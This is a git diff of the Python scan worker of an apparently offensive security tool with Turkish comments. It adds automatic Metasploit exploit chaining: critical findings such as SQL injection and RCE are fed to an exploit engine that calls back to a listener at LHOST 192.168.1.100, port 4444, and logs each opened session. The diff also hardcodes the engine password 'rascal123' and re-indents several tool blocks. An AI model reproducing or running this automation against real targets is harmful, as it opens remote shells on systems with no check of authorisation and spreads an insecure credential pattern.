@@ -1,5 +1,6 @@
 import time
-
+import logging
+import gc
 from cyberapp.models.db import db_conn
 from cybermodules.social_engineering import GhostEngine
 from cybermodules.arsenal import SupremeArsenalEngine
@@ -7,7 +8,7 @@ from cybermodules.ad_enum import ActiveDirectoryEnum
 from cybermodules.waf_bypass import WAFBypassEngine
 from cybermodules.llm_engine import LLMEngine
 from cybermodules.gamification import GamificationEngine
-from cybermodules.autoexploit import AutoExploit
+from cybermodules.autoexploit import AutoExploitEngine  # Yeni engine'ımız
 from cyberapp.services.progress import update_scan_progress
 
 
@@ -53,59 +54,59 @@ def run_worker(target, scan_id, run_python, selected_tools, user_id="anonymous")
                     )
                     conn.commit()
 
-        if "ad_enum" in selected_tools:
-            try:
-                ad = ActiveDirectoryEnum(target.replace("http://", "").replace("https://", ""), scan_id)
-                ad.start()
-            except Exception as e:
-                with db_conn() as conn:
-                    conn.execute(
-                        "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
-                        (scan_id, "AD_ENUM", f"Error: {str(e)[:100]}"),
-                    )
-                    conn.commit()
+            if "ad_enum" in selected_tools:
+                try:
+                    ad = ActiveDirectoryEnum(target.replace("http://", "").replace("https://", ""), scan_id)
+                    ad.start()
+                except Exception as e:
+                    with db_conn() as conn:
+                        conn.execute(
+                            "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
+                            (scan_id, "AD_ENUM", f"Error: {str(e)[:100]}"),
+                        )
+                        conn.commit()
 
-        if "waf_bypass" in selected_tools:
-            try:
-                waf = WAFBypassEngine(target, scan_id)
-                waf.start()
-            except Exception as e:
-                with db_conn() as conn:
-                    conn.execute(
-                        "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
-                        (scan_id, "WAF_BYPASS", f"Error: {str(e)[:100]}"),
-                    )
-                    conn.commit()
+            if "waf_bypass" in selected_tools:
+                try:
+                    waf = WAFBypassEngine(target, scan_id)
+                    waf.start()
+                except Exception as e:
+                    with db_conn() as conn:
+                        conn.execute(
+                            "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
+                            (scan_id, "WAF_BYPASS", f"Error: {str(e)[:100]}"),
+                        )
+                        conn.commit()
 
-        if "llm_analysis" in selected_tools:
-            try:
-                llm = LLMEngine(scan_id)
-                with db_conn() as conn:
-                    vulns = conn.execute(
-                        "SELECT type, url FROM vulns WHERE scan_id=?",
-                        (scan_id,),
-                    ).fetchall()
-                    for v in vulns:
-                        try:
-                            analysis = llm.analyze_vuln(v[0], v[1])
-                            conn.execute(
-                                "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
-                                (scan_id, "LLM_ANALIZ", analysis),
-                            )
-                        except Exception:
-                            pass
-                    conn.commit()
-            except Exception as e:
-                with db_conn() as conn:
-                    conn.execute(
-                        "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
-                        (scan_id, "LLM_ANALYSIS", f"Error: {str(e)[:100]}"),
-                    )
-                    conn.commit()
+            if "llm_analysis" in selected_tools:
+                try:
+                    llm = LLMEngine(scan_id)
+                    with db_conn() as conn:
+                        vulns = conn.execute(
+                            "SELECT type, url FROM vulns WHERE scan_id=?", (scan_id,)
+                        ).fetchall()
+                        for v in vulns:
+                            try:
+                                analysis = llm.analyze_vuln(v[0], v[1])
+                                conn.execute(
+                                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
+                                    (scan_id, "LLM_ANALIZ", analysis),
+                                )
+                            except Exception:
+                                pass
+                        conn.commit()
+                except Exception as e:
+                    with db_conn() as conn:
+                        conn.execute(
+                            "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
+                            (scan_id, "LLM_ANALYSIS", f"Error: {str(e)[:100]}"),
+                        )
+                        conn.commit()
 
         update_scan_progress(scan_id, 80, _eta(start_time, 80))
 
         execution_time = time.time() - start_time
+
         with db_conn() as conn:
             critical_vulns = conn.execute(
                 "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR')",
@@ -137,28 +138,76 @@ def run_worker(target, scan_id, run_python, selected_tools, user_id="anonymous")
                     )
                     conn.commit()
 
+        # === OTOMATİK METASPLOIT EXPLOIT CHAINING ===
         try:
+            logging.info("[AUTO EXPLOIT] Kritik zafiyet kontrolü ve otomatik exploit başlatılıyor...")
+
+            # <<< BURAYI DEĞİŞTİR! Kendi listener IP'ni yaz >>>
+            LHOST = "192.168.1.100"  # tun0 veya VPN IP'n
+
+            engine = AutoExploitEngine(password='rascal123')
+
             with db_conn() as conn:
-                critical_vulns = conn.execute(
-                    "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR')",
-                    (scan_id,),
-                ).fetchone()[0]
+                critical_rows = conn.execute(
+                    """
+                    SELECT host, port, type, url, extra_data, info 
+                    FROM vulns 
+                    WHERE scan_id = ? 
+                      AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'CRITICAL', 'HIGH')
+                    """,
+                    (scan_id,)
+                ).fetchall()
 
-            if critical_vulns > 0:
-                with db_conn() as conn:
-                    conn.execute(
-                        "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
-                        (scan_id, "AUTOEXPLOIT_TRIGGERED", "Kritik zafiyet bulundu, AutoExploit başlatılıyor..."),
-                    )
-                    conn.commit()
+            if not critical_rows:
+                logging.info("[AUTO EXPLOIT] Detaylı kritik kayıt bulunamadı, geçiliyor.")
+            else:
+                findings = []
+                for row in critical_rows:
+                    host = row[0] or target.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0]
+                    port = row[1] if row[1] else (445 if 'smb' in str(row[2]).lower() else 80)
+                    vuln_type = row[2]
 
-                autoexploit = AutoExploit(scan_id, target)
-                autoexploit.start()
-        except Exception as e:
+                    finding = {
+                        'ip': host,
+                        'port': port,
+                        'cve': None,
+                        'name': vuln_type,
+                        'service': vuln_type.lower().replace('_', ' ')
+                    }
+                    findings.append(finding)
+
+                logging.info(f"[AUTO EXPLOIT] {len(findings)} kritik zafiyet için exploit denenecek.")
+
+                exploit_results = engine.auto_chain_from_findings(findings=findings, lhost=LHOST, lport=4444)
+
+                success_count = 0
+                for res in exploit_results:
+                    if res.get('status') == 'success':
+                        success_count += 1
+                        session_id = res.get('session_id')
+                        module = res.get('exploit_module', 'Bilinmiyor')
+                        logging.info(f"[+] SESSION AÇILDI! ID: {session_id} | Module: {module}")
+
+                        with db_conn() as conn:
+                            conn.execute(
+                                "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
+                                (scan_id, "EXPLOIT_SUCCESS", f"Session {session_id} → {module}"),
+                            )
+                            conn.commit()
+                    else:
+                        logging.warning(f"[~] Exploit başarısız: {res.get('query', 'N/A')} → {res.get('status')}")
+
+                if success_count > 0:
+                    with db_conn() as conn:
+                        conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅ 🔴 SESSION AÇILDI' WHERE id = ?", (scan_id,))
+                        conn.commit()
+
+        except Exception as auto_e:
+            logging.error(f"[AUTO EXPLOIT HATA] {str(auto_e)}", exc_info=True)
             with db_conn() as conn:
                 conn.execute(
                     "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
-                    (scan_id, "AUTOEXPLOIT_AUTO", f"Error: {str(e)[:100]}"),
+                    (scan_id, "AUTOEXPLOIT_AUTO", f"Error: {str(auto_e)[:150]}"),
                 )
                 conn.commit()
 
@@ -171,10 +220,9 @@ def run_worker(target, scan_id, run_python, selected_tools, user_id="anonymous")
             )
             conn.commit()
         update_scan_progress(scan_id, 100, 0)
+
     finally:
         try:
-            import gc
-
             gc.collect()
         except Exception:
             pass
